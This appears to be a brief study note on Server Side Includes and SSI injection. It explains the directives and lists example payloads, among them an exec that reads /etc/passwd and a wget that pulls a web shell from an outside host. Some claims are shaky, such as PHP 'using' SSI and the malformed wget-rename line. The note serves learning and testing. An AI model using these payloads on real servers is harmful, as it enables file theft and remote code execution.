# Server Side Includes (SSI)

SSI is a coding mechanism to allow web server to perform tasks like displaying files or including a fileinto another file (kind of like an import?)

## `include` directive
This element inserts one html file into another html file.

Syntax to include path/file.html:
```
<!--#include virtual="path/file.html" -->
<!--#include file="path/file.html" -->
```

## `echo` directive
This element is used to display things dynamically on the web page

```
<!--#echo var="HTTP_HOST" var="DOCUMENT_URI" -->	www.st-andrews.ac.uk/itsnew/web/ssi/index.shtml
<!--#echo var="LAST_MODIFIED" -->	Friday, 07-May-2010 09:26:48 BST
<!--#echo var="DATE_LOCAL" -->	Thursday, 12-Aug-2021 09:52:57 BST
```

## `exec` directive
To execute system level commands
```
<!--#exec cmd="cat /etc/passwd" -->
```

## SSI Injection
SSI injection vulns arise when unsanitised user controlled data is put in place of an SSI directive. 

Examples:
```
<!--#exec cmd="ls" -->   -> ls is the user controlled input
<!--#exec cmd="cd /root/dir/">
<!--#exec cmd="wget http://mysite.com/shell.txt | rename shell.txt shell.php" -->

<!--#include file=”UUUUUUUU...UU”-->
```

Note: php uses SSI directives. 
Other templating engines are Angular JS.

### Impact
These vulns can be exploited to inject arbritrary content like JS. 
Can lead to:
* XSS
* Reading protected files
* Perfomring code execution (same impact as OS command injection)